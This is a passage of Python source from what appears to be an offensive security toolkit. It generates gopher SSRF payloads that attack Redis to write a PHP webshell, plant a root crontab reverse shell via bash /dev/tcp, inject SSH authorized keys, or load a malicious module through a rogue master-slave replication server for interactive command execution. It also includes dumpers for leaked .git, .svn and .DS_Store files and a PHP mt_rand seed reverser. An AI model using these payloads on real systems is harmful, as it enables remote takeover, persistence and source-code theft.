        webFile (str, optional): file path you want to write. Defaults to "/var/www/html/syc.php".
        content (str, optional): file content you want to write. Defaults to "<?php eval(['syc']); ?>".
        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.

    Returns:
        str: generated payload
    """
    start = f"gopher://{host}/_"
    origin = ""
    payload = [
        ["auth", f'{authPass}'] if authPass else [],
        ["flushall"],
        ["set", "1", f'{content}'],
        ["config", "set", "dir", f'{path.dirname(webFile)}'],
        ["config", "set", "dbfilename", f'{path.basename(webFile)}'],
        ["save"]
    ]
    for line in payload:
        origin += quote(_redis_format(*line))

    if urlEncoding:
        return quote(start + origin)

    return start + origin


def gopherredis_crontab(host: str, authPass: str = "", crontabFile: str = "/var/spool/cron/crontabs/root", reHost: str = "127.0.0.1:2020", urlEncoding: bool = False) -> str:
    """generate gopher payload for attack redis to write crontab.

    Args:
        host (str): target redis host.
        authPass (str, optional): redis auth pass. Defaults to "".
        crontabFile (str, optional): file path you want to write. Defaults to "/var/spool/cron/crontabs/root".
        reHost (str, optional): reverse shell host. Defaults to "127.0.0.1:2020".
        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.

    Returns:
        str: generated payload
    """
    start = f"gopher://{host}/_"
    origin = ""
    payload = [
        ["auth", f'{authPass}'] if authPass else [],
        ["flushall"],
        ["set", "1",
            f'\n\n*/1 * * * * bash -i >& /dev/tcp/{reHost.replace(":", "/")} 0>&1\n\n'],
        ["config", "set", "dir", f'{path.dirname(crontabFile)}'],
        ["config", "set", "dbfilename", f'{path.basename(crontabFile)}'],
        ["save"]
    ]
    for line in payload:
        origin += quote(_redis_format(*line))

    if urlEncoding:
        return quote(start + origin)

    return start + origin


def gopherredis_ssh(host: str, authPass: str = "", sshFile: str = "/root/.ssh/authorized_keys", content: str = "", urlEncoding: bool = False) -> str:
    """generate gopher payload for attack redis to write ssh authorized keys.

    Args:
        host (str): target redis host.
        authPass (str, optional): redis auth pass. Defaults to "".
        sshFile (str, optional): file path you want to write. Defaults to "/root/.ssh/authorized_keys".
        content (str, optional): file content you want to write. Defaults to "127.0.0.1:2020".
        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.

    Returns:
        str: generated payload
    """
    start = f"gopher://{host}/_"
    origin = ""

    payload = [
        ["auth", f'{authPass}'] if authPass else [],
        ["flushall"],
        ["set", "1", f'\n\n{content}\n\n'],
        ["config", "set", "dir", f'{path.dirname(sshFile)}'],
        ["config", "set", "dbfilename", f'{path.basename(sshFile)}'],
        ["save"]
    ]

    for line in payload:
        origin += quote(_redis_format(*line))

    if urlEncoding:
        return quote(start + origin)

    return start + origin


def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str = "",
                    expFileName: str = "syc.so", expFilePath: str = "", command="id",  interactive: bool = False, urlEncoding: bool = False):
    """generate gopher payload for attack redis by master-slave replication.This will be a series of processes, including output payload, listen server, etc.

    Args:
        host (str): target redis host.
        masterHost (str, optional): listen host. Defaults to "127.0.0.1:2020".
        authPass (str, optional): redis auth pass. Defaults to "".
        expFileName (str, optional): exploit file name, you can custom it like *.so. Defaults to "syc.so".
        expFilePath (str, optional): exploit file path, if not provided, use the default exp.so. Defaults to "".
        command (str, optional): command you want to run. Defaults to "id".
        interactive (bool, optional): Whether to enter the interactive mode, in the interactive mode enter command will automatically generate payload. Defaults to False.
        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
    """

    def formatOutput(content: str, urlEncoding: bool = False):
        if urlEncoding:
            return quote(content)
        return content

    def RogueServer(ip, port):
        expfp = expFilePath or path.join(path.split(path.realpath(__file__))[
            0], "../", "thirdparty", "redis", "exp.so")
        with open(expfp, "rb") as f:
            exp = f.read()

        flag = True

        s = socket(AF_INET, SOCK_STREAM)
        s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(10)
        client, _ = s.accept()
        while flag:
            getData = client.recv(1024)
            if b"PING" in getData:
                client.send(b"+PONG\r\n")
                flag = True
            elif b"REPLCONF" in getData:
                client.send(b"+OK\r\n")
                flag = True
            elif b"PSYNC" in getData or b"SYNC" in getData:
                client.send(b"+FULLRESYNC " + b"sycv5" * 8 + b" 1\r\n" + b"$" + str(
                    len(exp)).encode() + b"\r\n" + exp + b"\r\n")
                flag = False

    start = f"gopher://{host}/_"
    origin = ""

    payload = [
        ["auth", f'{authPass}'] if authPass else [],
        ["flushall"],
        ["slaveof", "no", "one"],
        ["slaveof", masterHost.split(":")[0], masterHost.split(":")[-1]],
        ["config", "set", "dbfilename", f'{path.basename(expFileName)}'],
    ]

    for line in payload:
        origin += quote(_redis_format(*line))
    print("--- Ready slave ---")
    print(formatOutput(start + origin, urlEncoding))

    print("--- Build server ---")
    host_list = masterHost.split(":")
    ip, port = host_list[0], host_list[1]
    print(f"Listen on {ip}:{port}... ")
    RogueServer(ip=ip, port=int(port))

    print("--- Load module ---")
    origin = ""
    payload = [
        ["auth", f'{authPass}'] if authPass else [],
        ["module", "load", f"./{expFileName}"]
    ]
    for line in payload:
        origin += quote(_redis_format(*line))
    print(formatOutput(start + origin, urlEncoding))

    if not interactive:
        origin = ""
        payload = [
            ["auth", f'{authPass}'] if authPass else [],
            ["system.exec", f'{command}']
        ]
        for line in payload:
            origin += quote(_redis_format(*line))

        print(f"--- Command {command} ---")
        print(formatOutput(start + origin, urlEncoding))
    else:
        try:
            while interactive:
                command = input("command:> ")
                if command == "exit" or command == "quit":
                    break
                origin = ""
                payload = [
                    ["auth", f'{authPass}'] if authPass else [],
                    ["system.exec", f'{command}']
                ]
                for line in payload:
                    origin += quote(_redis_format(*line))

                print(f"--- Command {command} ---")
                print(formatOutput(start + origin, urlEncoding))
        except KeyboardInterrupt:
            print()
            print("--- exit ---")
        except Exception as e:
            print(f"--- Error: {e} ---")


class _BasicDumper(object):

    def __init__(self, url: str, outdir: str, threadNum: int = 20):
        self.url = url
        self.outdir = outdir
        self.targets = []
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"
        }
        self.threadNum = threadNum
        self.lock = Lock()
        self.session = requests.Session()

    def start(self):
        self.dump()

    def dump(self):
        pass

    def download(self, target: tuple):
        url, filename = target

        # 创建目标目录（filename可能包含部分目录）
        fullname = os.path.join(self.outdir, filename)
        outdir = os.path.dirname(fullname)
        if outdir:
            if not os.path.exists(outdir):
                try:
                    os.makedirs(outdir)
                except FileExistsError:
                    pass
            elif os.path.isfile(outdir):
                # 如果之前已经作为文件写入了，则需要删除
                self.lock.acquire()
                print(
                    "Dump warning: %s is a file, it will be replace as a folder" % outdir)
                self.lock.release()
                os.remove(outdir)
                os.makedirs(outdir)

        # 获取数据
        status, data = self.fetch(url)
        if status != 200 or data is None:
            # None才代表出错，data可能为b""
            raise DumpError("Fetch file error: [%s] %s %s" % (
                status, url, filename))
        self.lock.acquire()
        print("[+] %s" % (filename))
        self.lock.release()

        # 处理数据（如有必要）
        data = self.convert(data)

        # 保存数据
        try:
            with open(fullname, "wb") as f:
                f.write(data)
        except IsADirectoryError:
            # 多协程/线程/进程下，属于正常情况
            pass
        except Exception as e:
            self.lock.acquire()
            print("Dump error: %s %s" % (url, filename))
            print(str(e.args))
            self.lock.release()

    def convert(self, data: bytes) -> bytes:
        """ 处理数据 """
        return data

    def fetch(self, url: str, times: int = 3) -> tuple:
        """ 从URL获取内容，如果失败默认重试三次 """
        # # TODO：下载大文件需要优化
        s = self.session
        while times:
            try:
                res = s.get(url, headers=self.headers)
                ret = (res.status_code, res.content)
                return ret
            except Exception:
                times -= 1
        return (0, None)

    def startPool(self):
        with ThreadPoolExecutor(max_workers=self.threadNum) as pool:
            tasks = [pool.submit(self.download, target)
                     for target in self.targets]
            for task in as_completed(tasks):
                err = task.exception()
                if err:
                    if isinstance(err, DumpError):
                        print("Dump error: %s" % err)
                    else:
                        raise err

    def parse(self, url: str):
        """ 从URL下载文件并解析 """
        pass

    def indexfile(self, url: str) -> NamedTemporaryFile:
        """ 创建一个临时索引文件index/wc.db """
        idxfile = NamedTemporaryFile(delete=False)
        status, data = self.fetch(url)
        if not data:
            raise DumpError("Fetch index file error")
        with open(idxfile.name, "wb") as f:
            f.write(data)
        return idxfile


class _GitDumper(_BasicDumper):
    def __init__(self, url: str, outdir: str, threadNum: int = 20):
        super(_GitDumper, self).__init__(url, outdir, threadNum)
        self.base_url = sub("\.git.*", ".git", url)

    def start(self):
        """ 入口方法 """
        self.dump()

    def dump(self):
        try:
            idxFile = self.indexfile(self.base_url + "/index")
            for entry in GitParse(idxFile.name):
                if "sha1" in entry.keys():
                    sha1 = entry.get("sha1", "").strip()
                    filename = entry.get("name", "").strip()
                    if not sha1 or not filename:
                        continue
                    targetUrl = "%s/objects/%s/%s" % (
                        self.base_url, sha1[:2], sha1[2:])
                    self.targets.append((targetUrl, filename))
            self.startPool()
        finally:
            if idxFile:
                os.remove(idxFile.name)

    def convert(self, data: bytes) -> bytes:
        """ 用zlib对数据进行解压 """
        if data:
            try:
                data = zlib_decompress(data)
                # Bytes正则匹配
                data = sub(rb"blob \d+\x00", b"", data)
            except Exception as e:
                print("Dump error: %s " % str(e.args))
        return data


class _SvnDumper(_BasicDumper):
    def __init__(self, url: str, outdir: str, threadNum: int = 20):
        super(_SvnDumper, self).__init__(url, outdir, threadNum)
        self.base_url = sub("\.svn.*", ".svn", url)

    def start(self):
        """ dumper入口方法 """
        entries_url = self.base_url + "/entries"
        status, data = self.fetch(entries_url)
        if not data:
            raise SvnParseError("Fetch entries file error")
        if data == b"12\n":
            self.dump()
        else:
            # TODO: 针对svn1.7以前的版本
            print("SVN version before 1.7, todo")
            self.dump_legacy()

    def dump(self):
        try:
            """ 针对svn1.7以后的版本 """
            # 创建一个临时文件用来存储wc.db
            idxFile = self.indexfile(self.base_url + "/wc.db")
            # 从wc.db中解析URL和文件名
            for item in self.parse(idxFile.name):
                sha1, filename = item
                if not sha1 or not filename:
                    continue
                url = "%s/pristine/%s/%s.svn-base" % (
                    self.base_url, sha1[6:8], sha1[6:])
                self.targets.append((url, filename))
            idxFile.close()
            self.startPool()
        finally:
            if idxFile:
                os.remove(idxFile.name)

    def dump_legacy(self):
        """ 针对svn1.7以前的版本 """
        pass

    def parse(self, filename: str) -> list:
        """ sqlite解析wc.db并返回一个(hash, name)组成列表 """
        try:
            conn = sqlite3.connect(filename)
            cursor = conn.cursor()
            cursor.execute("select checksum, local_relpath from NODES")
            items = cursor.fetchall()
            cursor.execute(
                "select checksum, substr(md5_checksum,7) from PRISTINE")
            items.extend(cursor.fetchall())
            newitems = []
            checksumList = []
            for item in items:
                if (item[0]) not in checksumList:
                    checksumList.append(item[0])
                    newitems.append(item)
            conn.close()
            return newitems
        except Exception as e:
            raise SvnParseError(
                "Invalid .svn / Sqlite connection failed") from e


class _DSStoreDumper(_BasicDumper):
    def __init__(self, url: str, outdir: str, threadNum: int = 20):
        super(_DSStoreDumper, self).__init__(url, outdir, threadNum)
        self.base_url = sub("/\.DS_Store.*", "", url, flags=IGNORECASE)
        self.url_queue = Queue()

    def start(self):
        self.url_queue.put(self.base_url)
        self.parse_loop()
        self.dump()

    def dump(self):
        self.startPool()

    def parse_loop(self):
        """ 从url_queue队列中读取URL，根据URL获取并解析DS_Store """
        while not self.url_queue.empty():
            base_url = self.url_queue.get()
            status, ds_data = self.fetch(base_url + "/.DS_Store")
            if status != 200 or not ds_data:
                continue
            try:
                # 解析DS_Store
                ds = DS_Store(ds_data)
                sets = set(ds.traverse_root())
                if not sets:
                    raise DSStoreParseError("Empty .DS_Store")
                for filename in sets:
                    new_url = "%s/%s" % (base_url, filename)
                    self.url_queue.put(new_url)
                    # 从URL中获取path并删除最前面的/
                    # 不删除/会导致path.join出错，从而导致创建文件失败
                    fullname = urlparse(new_url).path.lstrip("/")
                    self.targets.append((new_url, fullname))
            except Exception as e:
                # 如果解析失败则不是DS_Store文件
                raise DSStoreParseError("Invalid .DS_Store") from e


def leakdump(url: str, outputDir: str = "", threadNum: int = 20):
    """A function for source code leaks, support .git .svn .DS_Store

    Origin:
        https://github.com/0xHJK/dumpall

    Args:
        url (str): the target url.
        outputDir (str, optional): Output directory. Defaults to ./{hostname}.
        threadNum (int, optional): thread number. Defaults to 20.

    Raises:
        DumpError

    Example:
        leakdump("http://example.com/.git")
        leakdump("http://example.com/.svn")
        leakdump("http://example.com/.DS_Store")
    """

    url = url.rstrip("/")
    lower_url = url.lower()
    if not outputDir:
        parsed_url = urlparse(url)
        outputDir = path.join("./", parsed_url.hostname)
    availiable_endswith = [".git", ".svn", ".ds_store"]
    if not any(ends for ends in availiable_endswith if lower_url.endswith(ends)):
        raise DumpError("Not availiable url")

    if lower_url.endswith(".git"):
        dumper = _GitDumper(url, outputDir, threadNum)
        dumper.start()

    if lower_url.endswith(".svn"):
        dumper = _SvnDumper(url, outputDir, threadNum)
        dumper.start()

    if lower_url.endswith(".ds_store"):
        dumper = _DSStoreDumper(url, outputDir, threadNum)
        dumper.start()


def reverse_mt_rand(_R000: int, _R227: int, offset: int, flavour: int) -> int:
    """reverse mt_rand seed without brute force

    Origin:
        https://github.com/ambionics/mt_rand-reverse

    Args:
        _R000 (int): first random value.
        _R227 (int): 228th random value.
        offset (int): number of mt_rand() calls in between the seeding and the first value.
        flavour (int): 0 (PHP5) or 1 (PHP7+)

    Returns:
        int: the seed
    """
    return reverse_mt_rand_main(_R000, _R227, offset, flavour)


def php_serialize_S(string: str) -> str:
    """change normal string to php serialize S stirng

    Args:
        string (str): normal string

    Returns:
        str: php serialize S stirng
    """
    string = bin2hex(string)
    if not string:
        return ""

    return "".join("\\" + string[i:i+2] for i in range(0, len(string), 2))
